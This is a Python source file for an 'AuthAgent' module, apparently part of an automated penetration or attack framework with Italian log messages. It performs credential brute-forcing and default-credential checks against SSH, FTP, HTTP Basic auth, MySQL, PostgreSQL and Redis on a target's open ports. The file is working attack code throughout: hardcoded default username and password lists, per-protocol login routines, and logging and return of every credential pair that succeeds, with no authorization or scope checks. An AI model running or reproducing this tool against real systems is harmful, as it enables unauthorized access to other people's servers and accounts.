import socket, itertools, time
from typing import Any, Dict, List, Optional, Tuple
from core.base_agent import BaseAgent

DEFAULT_USERNAMES = ["admin","root","administrator","user","test","guest","mysql","postgres","sa","pi"]
DEFAULT_PASSWORDS = ["","admin","root","password","123456","admin123","test","guest","pass","toor"]
SERVICE_DEFAULTS = {
    "ssh": [("root",""),("root","root"),("admin","admin")],
    "ftp": [("anonymous",""),("ftp","ftp")],
    "mysql": [("root",""),("root","root")],
    "postgresql": [("postgres","postgres")],
    "redis": [("","")],
}

class AuthAgent(BaseAgent):
    name = "auth"
    description = "Brute-force, default creds, credential stuffing su protocolli multipli"
    phase = "AUTH_ATTACK"

    def run(self, state: Any, params: Dict) -> Dict:
        ports = state.open_ports
        max_attempts = params.get("max_attempts", 50)
        protocols = params.get("protocols", ["ssh","ftp","http","mysql","postgresql"])
        stop_on_first = params.get("stop_on_first", True)
        found_credentials = []
        tested_total = 0

        for port_info in ports:
            service = port_info.get("service", "").lower()
            port_num = port_info.get("port")
            ip = state.ip if hasattr(state, "ip") else state.target
            proto = self._normalize_service(service, port_num)
            if proto not in protocols:
                continue
            self.log(f"Attacco {proto} su {ip}:{port_num}")
            defaults = SERVICE_DEFAULTS.get(proto, [])
            creds_to_try = self._build_wordlist(proto, None, max_attempts)
            all_creds = list(dict.fromkeys(defaults + creds_to_try))[:max_attempts]
            for user, password in all_creds:
                tested_total += 1
                success = self._try_login(proto, ip, port_num, user, password)
                if success:
                    entry = {"protocol": proto, "host": ip, "port": port_num,
                             "username": user, "password": password if password else "<blank>",
                             "method": "default" if (user,password) in defaults else "brute-force"}
                    found_credentials.append(entry)
                    self.log(f"  [HIT] {proto}://{user}:{password}@{ip}:{port_num}")
                    if stop_on_first:
                        break
                time.sleep(0.5)
        self.log(f"Tentativi totali: {tested_total} | Credenziali trovate: {len(found_credentials)}")
        return {"credentials": found_credentials, "total_found": len(found_credentials),
                "total_tested": tested_total, "services_attacked": list({c["protocol"] for c in found_credentials})}

    def _try_login(self, proto: str, host: str, port: int, user: str, password: str) -> bool:
        try:
            if proto == "ssh":
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, port=port, username=user, password=password,
                               timeout=5, look_for_keys=False, allow_agent=False)
                client.close()
                return True
            elif proto == "ftp":
                import ftplib
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=5)
                ftp.login(user, password)
                ftp.quit()
                return True
            elif proto in ("http","https"):
                import urllib.request, base64
                url = f"{proto}://{host}:{port}/"
                creds = base64.b64encode(f"{user}:{password}".encode()).decode()
                req = urllib.request.Request(url, headers={"Authorization": f"Basic {creds}"})
                with urllib.request.urlopen(req, timeout=5) as r:
                    return r.status == 200
            elif proto == "mysql":
                import mysql.connector
                conn = mysql.connector.connect(host=host, port=port, user=user, password=password, connect_timeout=5)
                conn.close()
                return True
            elif proto == "postgresql":
                import psycopg2
                conn = psycopg2.connect(host=host, port=port, user=user, password=password, connect_timeout=5, dbname="postgres")
                conn.close()
                return True
            elif proto == "redis":
                with socket.socket() as s:
                    s.settimeout(3)
                    s.connect((host, port))
                    if password:
                        s.send(f"AUTH {password}\r\n".encode())
                    else:
                        s.send(b"PING\r\n")
                    resp = s.recv(64).decode(errors="replace")
                    return "+OK" in resp or "+PONG" in resp
        except Exception:
            return False
        return False

    def _build_wordlist(self, proto: str, custom: Optional[List], limit: int) -> List[tuple]:
        pairs = list(itertools.product(DEFAULT_USERNAMES[:10], DEFAULT_PASSWORDS[:10]))
        if custom:
            pairs = custom + pairs
        return pairs[:limit]

    def _normalize_service(self, service: str, port: int) -> str:
        mapping = {443:"https",80:"http",8080:"http",22:"ssh",21:"ftp",3306:"mysql",5432:"postgresql",6379:"redis"}
        return mapping.get(port, service)